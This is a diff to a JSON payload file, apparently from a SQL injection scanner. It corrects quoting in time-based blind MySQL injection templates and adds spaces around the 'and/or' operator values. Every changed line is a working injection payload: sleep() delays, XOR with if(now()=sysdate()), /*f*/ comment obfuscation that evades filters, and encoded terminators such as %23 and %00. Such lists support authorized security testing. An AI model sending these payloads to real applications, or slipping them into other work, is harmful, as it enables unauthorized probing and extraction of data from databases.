@@ -22,7 +22,7 @@
                 " QUOTE  'XOR(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))XOR'  QUOTE",
                 "'%E2%84%A2' QUOTE '/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)=' QUOTE ",
                 "'%E2%84%A2' QUOTE ')/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)=' QUOTE",
-                "'%E2%84%A2 QUOTE )/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)=' QUOTE",
+                "'%E2%84%A2' QUOTE ')/*F*/' OP '/*f*/sleep(PTINJECTORDELAY)=' QUOTE",
                 " OP '(if(now()=sysdate(),sleep(PTINJECTORDELAY),0))' OP '%23'",
                 " QUOTE  OP  'sleep(PTINJECTORDELAY)--#'",
                 " QUOTE  OP  'sleep(PTINJECTORDELAY)#'",
@@ -34,12 +34,12 @@
                 " QUOTE  OP  'sleep(PTINJECTORDELAY);%00'",
                 " OP  'sleep(PTINJECTORDELAY)--+-'",
                 " OP  'sleep(PTINJECTORDELAY)#'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY)--#'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY)#'",
+                " QUOTE '/*f*/' OP '/*f*/sleep/*f*/(PTINJECTORDELAY)--#'",
+                " QUOTE '/*f*/' OP '/*f*/sleep/*f*/(PTINJECTORDELAY)#'",
                 " OP  'sleep(PTINJECTORDELAY)%23'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY)--%23'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY)%23'",
-                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(PTINJECTORDELAY);%00'",
+                " QUOTE '/*f*/' OP '/*f*/sleep/*f*/(PTINJECTORDELAY)--%23'",
+                " QUOTE '/*f*/' OP '/*f*/sleep/*f*/(PTINJECTORDELAY)%23'",
+                " QUOTE '/*f*/' OP '/*f*/sleep/*f*/(PTINJECTORDELAY);%00'",
                 " OP '/*f*/sleep/*f*/(PTINJECTORDELAY)--+-'",
                 " OP '/*f*/sleep/*f*/(PTINJECTORDELAY)#'",
 
@@ -70,7 +70,7 @@
             "tags": ["payload_template"],
             "vars":{
                 "QUOTE": ["'"],
-                "OP": ["and", "AND", "OR", "or"],
+                "OP": [" and ", " AND ", " OR ", " or "],
                 "encoding": ["none", "quote"]
             }
         },
